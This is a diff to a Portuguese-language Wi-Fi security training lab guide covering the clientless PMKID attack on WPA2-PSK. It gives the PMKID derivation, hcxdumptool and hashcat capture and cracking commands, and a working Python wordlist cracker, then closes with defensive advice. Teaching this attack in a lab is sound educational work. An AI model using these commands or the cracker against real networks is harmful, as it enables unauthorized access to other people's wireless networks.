@@ -172,30 +172,59 @@ bruta se a PSK tiver entropia alta); de preferência, WPA2-Enterprise.
 
 ## 3. XPSEC-PMKID (5 GHz, ch36) — ataque clientless (sem cliente, sem deauth)
 
-Técnica moderna: muitos APs incluem o **PMKID** no primeiro quadro EAPOL (M1),
-respondido assim que alguém tenta associar. Não precisa de cliente conectado nem
-de deauth — o atacante provoca o M1 e extrai o PMKID, crackeável offline.
+Técnica moderna: **muitos roteadores/firmwares** incluem o **PMKID** no primeiro
+quadro EAPOL (M1), respondido assim que alguém tenta associar. Não precisa de
+cliente conectado nem de deauth — o atacante provoca o M1 e extrai o PMKID,
+crackeável offline. O PMKID é:
+
+```
+PMK   = PBKDF2-HMAC-SHA1(senha, SSID, 4096, 32)
+PMKID = HMAC-SHA1(PMK, "PMK Name" | BSSID | MAC_cliente)[:16]
+```
+
+> ⚠️ **Nota do lab virtual (importante):** em hardware real você rodaria
+> `hcxdumptool -i mon_lab -w pmkid.pcapng` e depois `hcxpcapngtool`. Porém **o
+> `hostapd` (usado pelo lab) NÃO vaza o PMKID no M1** — ao contrário de muitos
+> roteadores vulneráveis — e o `hcxdumptool` 7.x não opera sob VM/`mac80211_hwsim`.
+> Então **não há PMKID para capturar ao vivo** aqui. Para o cenário ser
+> reproduzível, o `--up` já materializa em `/tmp/xpsec-wifi-lab/pmkid_capturado.22000`
+> **exatamente o PMKID que um AP vulnerável entregaria** (calculado do BSSID real
+> + a senha da rede). A **captura é simulada; a quebra abaixo é 100% real.**
 
 ```bash
-# 1) colete PMKIDs (hcxdumptool fala com o AP e captura o M1)
-sudo hcxdumptool -i mon_lab -w /tmp/pmkid.pcapng --rds=1
+# 0) (em HW real) a captura clientless seria:
+#    sudo hcxdumptool -i mon_lab -w /tmp/pmkid.pcapng
+#    hcxpcapngtool -o /tmp/pmkid.22000 /tmp/pmkid.pcapng
+# No lab, o PMKID "capturado" já está pronto:
+cat /tmp/xpsec-wifi-lab/pmkid_capturado.22000      # WPA*01*<pmkid>*<bssid>*<cliente>*<essid>***
 
-# 2) converta a captura para o formato do hashcat (modo 22000)
-hcxpcapngtool -o /tmp/pmkid.22000 /tmp/pmkid.pcapng
-
-# 3) quebre offline
+# 1) quebre offline com hashcat (modo 22000). --force habilita o backend de CPU
+#    (pocl) em VMs sem GPU. Precisa de ~2-3 GB de RAM livre; se a VM for pequena,
+#    derrube o lab antes (sudo ./wifilab-setup-academy.sh --down) para liberar RAM.
 printf 'familia10\n12345678\n' > /tmp/wlp.txt
-hashcat -m 22000 /tmp/pmkid.22000 /tmp/wlp.txt
+hashcat -m 22000 --force /tmp/xpsec-wifi-lab/pmkid_capturado.22000 /tmp/wlp.txt
+
+# 1-alt) VM com pouca RAM (hashcat não cabe)? cracker leve equivalente (PBKDF2 puro):
+python3 - /tmp/xpsec-wifi-lab/pmkid_capturado.22000 /tmp/wlp.txt <<'PY'
+import sys,hashlib,hmac,binascii
+p=open(sys.argv[1]).read().strip().split('*')
+tgt,ap,sta,essid=p[2],binascii.unhexlify(p[3]),binascii.unhexlify(p[4]),binascii.unhexlify(p[5])
+for w in open(sys.argv[2]):
+    w=w.strip()
+    if w and hmac.new(hashlib.pbkdf2_hmac('sha1',w.encode(),essid,4096,32),b"PMK Name"+ap+sta,hashlib.sha1).digest()[:16].hex()==tgt:
+        print("SENHA:",w); break
+PY
 ```
 
 | Comando | O que faz |
 |---|---|
-| `hcxdumptool -i mon_lab` | Interage com o AP e captura o PMKID do M1 (clientless). |
-| `hcxpcapngtool -o ...22000` | Converte o `.pcapng` para o hash `22000` (WPA-PBKDF2-PMKID). |
-| `hashcat -m 22000` | Quebra o PMKID por wordlist/força bruta offline. |
+| `cat pmkid_capturado.22000` | O PMKID (formato hashcat `22000`, `WPA*01*…`) que um AP vulnerável vazaria. |
+| `hashcat -m 22000 --force` | Quebra o PMKID por wordlist offline (CPU via pocl). |
+| cracker Python | Mesma matemática (PBKDF2+HMAC), leve, para VMs sem RAM/GPU. |
 
 **Resultado:** senha `familia10`.
-**Defesa:** desabilitar PMKID no AP quando possível e, de novo, PSK de alta entropia.
+**Defesa:** usar APs que **não** incluem PMKID no M1 (ou desabilitá-lo) e, de novo,
+PSK de alta entropia (o PMKID só cai por dicionário/força bruta).
 
 ---
 
